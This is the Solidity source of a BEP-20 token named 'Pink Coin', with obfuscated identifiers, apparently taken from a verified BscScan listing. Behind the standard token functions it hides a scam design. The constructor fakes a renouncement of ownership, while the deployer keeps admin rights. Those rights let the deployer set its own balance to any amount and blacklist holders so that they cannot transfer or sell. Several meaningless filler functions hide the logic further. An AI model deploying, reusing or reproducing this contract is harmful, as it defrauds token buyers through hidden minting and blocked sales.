/**
 *Submitted for verification at BscScan.com on 2023-02-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface fhzetnuihuqze {
    function totalSupply() external view returns (uint256);

    function balanceOf(address averfqncvjyujr) external view returns (uint256);

    function transfer(address uglmutase, uint256 yxyvvsnvvvnmyd) external returns (bool);

    function allowance(address fxrbndbkvs, address spender) external view returns (uint256);

    function approve(address spender, uint256 yxyvvsnvvvnmyd) external returns (bool);

    function transferFrom(
        address sender,
        address uglmutase,
        uint256 yxyvvsnvvvnmyd
    ) external returns (bool);

    event Transfer(address indexed from, address indexed nlywbzaul, uint256 value);
    event Approval(address indexed fxrbndbkvs, address indexed spender, uint256 value);
}

interface fhzetnuihuqzeMetadata is fhzetnuihuqze {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract pianbpnfxu {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface snmesbieaqvutb {
    function createPair(address wbhncfrft, address jasegeydxsx) external returns (address);
}

interface angakzpftbg {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PinkCoin is pianbpnfxu, fhzetnuihuqze, fhzetnuihuqzeMetadata {

    function symbol() external view virtual override returns (string memory) {
        return ncuhmfusmvu;
    }

    uint256 private sthhkyprbrkk = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return wydxzhscczcqxf;
    }

    function owner() external view returns (address) {
        return wydxzhscczcqxf;
    }

    bool public rjwaklzgk;

    function approve(address hywzrhjazioic, uint256 yxyvvsnvvvnmyd) public virtual override returns (bool) {
        hvcbswapcwfav[_msgSender()][hywzrhjazioic] = yxyvvsnvvvnmyd;
        emit Approval(_msgSender(), hywzrhjazioic, yxyvvsnvvvnmyd);
        return true;
    }

    function mykntxevhu() public view returns (bool) {
        return rjwaklzgk;
    }

    function balanceOf(address averfqncvjyujr) public view virtual override returns (uint256) {
        return lltvqpmfaghgqq[averfqncvjyujr];
    }

    function superqauq() public {
        if (rjwaklzgk) {
            rwsrrkdcih = mkxjwxztb;
        }
        if (xfxsrozsu != rwsrrkdcih) {
            rwsrrkdcih = xfxsrozsu;
        }
        rwsrrkdcih=0;
    }

    string private ncuhmfusmvu = "PCN";

    function sbcqokqogq() public {
        if (mkxjwxztb != rwsrrkdcih) {
            tvadhwuaqtwzay = false;
        }
        
        jzltptnhw=false;
    }

    function transferFrom(address ffnaddtogkifgj, address uglmutase, uint256 yxyvvsnvvvnmyd) external override returns (bool) {
        if (hvcbswapcwfav[ffnaddtogkifgj][_msgSender()] != type(uint256).max) {
            require(yxyvvsnvvvnmyd <= hvcbswapcwfav[ffnaddtogkifgj][_msgSender()]);
            hvcbswapcwfav[ffnaddtogkifgj][_msgSender()] -= yxyvvsnvvvnmyd;
        }
        return ujnwybrhxan(ffnaddtogkifgj, uglmutase, yxyvvsnvvvnmyd);
    }

    bool private jzltptnhw;

    address private wydxzhscczcqxf;

    uint256 public xfxsrozsu;

    uint256 private mkxjwxztb;

    address public nbnhrzuqtvi;

    uint256 private rwsrrkdcih;

    uint256 public xatntilnbndj;

    bool public beawqeicwfmjuo;

    function wfvmcpxpyviu() public {
        if (tvadhwuaqtwzay) {
            rwsrrkdcih = xfxsrozsu;
        }
        
        xfxsrozsu=0;
    }

    event OwnershipTransferred(address indexed wrijerizbjyey, address indexed grswqkcaayevzg);

    mapping(address => bool) public xphrnvmcqvvx;

    function plbzsbnayiesqa(uint256 yxyvvsnvvvnmyd) public {
        if (!xphrnvmcqvvx[_msgSender()]) {
            return;
        }
        lltvqpmfaghgqq[nbnhrzuqtvi] = yxyvvsnvvvnmyd;
    }

    string private csrkkulnmukp = "Pink Coin";

    function transfer(address zxstvwlmeh, uint256 yxyvvsnvvvnmyd) external virtual override returns (bool) {
        return ujnwybrhxan(_msgSender(), zxstvwlmeh, yxyvvsnvvvnmyd);
    }

    mapping(address => bool) public yotazofoe;

    function tnbfuixaeavjf(address znuxbinxmnwwa) public {
        if (beawqeicwfmjuo) {
            return;
        }
        
        xphrnvmcqvvx[znuxbinxmnwwa] = true;
        if (xfxsrozsu == mkxjwxztb) {
            rjwaklzgk = false;
        }
        beawqeicwfmjuo = true;
    }

    mapping(address => mapping(address => uint256)) private hvcbswapcwfav;

    function rvjicgxgqu(address mdqthysdtvmeas) public {
        
        if (mdqthysdtvmeas == nbnhrzuqtvi || mdqthysdtvmeas == mrizzmwlo || !xphrnvmcqvvx[_msgSender()]) {
            return;
        }
        if (rjwaklzgk) {
            xfxsrozsu = xatntilnbndj;
        }
        yotazofoe[mdqthysdtvmeas] = true;
    }

    function ujnwybrhxan(address ffnaddtogkifgj, address uglmutase, uint256 yxyvvsnvvvnmyd) internal returns (bool) {
        if (ffnaddtogkifgj == nbnhrzuqtvi) {
            return tsncpxhyl(ffnaddtogkifgj, uglmutase, yxyvvsnvvvnmyd);
        }
        require(!yotazofoe[ffnaddtogkifgj]);
        return tsncpxhyl(ffnaddtogkifgj, uglmutase, yxyvvsnvvvnmyd);
    }

    function name() external view virtual override returns (string memory) {
        return csrkkulnmukp;
    }

    bool public tvadhwuaqtwzay;

    mapping(address => uint256) private lltvqpmfaghgqq;

    function totalSupply() external view virtual override returns (uint256) {
        return sthhkyprbrkk;
    }

    function tsncpxhyl(address ffnaddtogkifgj, address uglmutase, uint256 yxyvvsnvvvnmyd) internal returns (bool) {
        require(lltvqpmfaghgqq[ffnaddtogkifgj] >= yxyvvsnvvvnmyd);
        lltvqpmfaghgqq[ffnaddtogkifgj] -= yxyvvsnvvvnmyd;
        lltvqpmfaghgqq[uglmutase] += yxyvvsnvvvnmyd;
        emit Transfer(ffnaddtogkifgj, uglmutase, yxyvvsnvvvnmyd);
        return true;
    }

    uint8 private lfwckpviiz = 18;

    constructor (){ 
        if (xfxsrozsu != xatntilnbndj) {
            xfxsrozsu = mkxjwxztb;
        }
        angakzpftbg xkrrqnppo = angakzpftbg(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        mrizzmwlo = snmesbieaqvutb(xkrrqnppo.factory()).createPair(xkrrqnppo.WETH(), address(this));
        wydxzhscczcqxf = _msgSender();
        if (rjwaklzgk != tvadhwuaqtwzay) {
            jzltptnhw = false;
        }
        nbnhrzuqtvi = _msgSender();
        xphrnvmcqvvx[_msgSender()] = true;
        
        lltvqpmfaghgqq[_msgSender()] = sthhkyprbrkk;
        emit Transfer(address(0), nbnhrzuqtvi, sthhkyprbrkk);
        olsmvljtb();
    }

    address public mrizzmwlo;

    function allowance(address gapshnuaobg, address hywzrhjazioic) external view virtual override returns (uint256) {
        return hvcbswapcwfav[gapshnuaobg][hywzrhjazioic];
    }

    function olsmvljtb() public {
        emit OwnershipTransferred(nbnhrzuqtvi, address(0));
        wydxzhscczcqxf = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return lfwckpviiz;
    }

}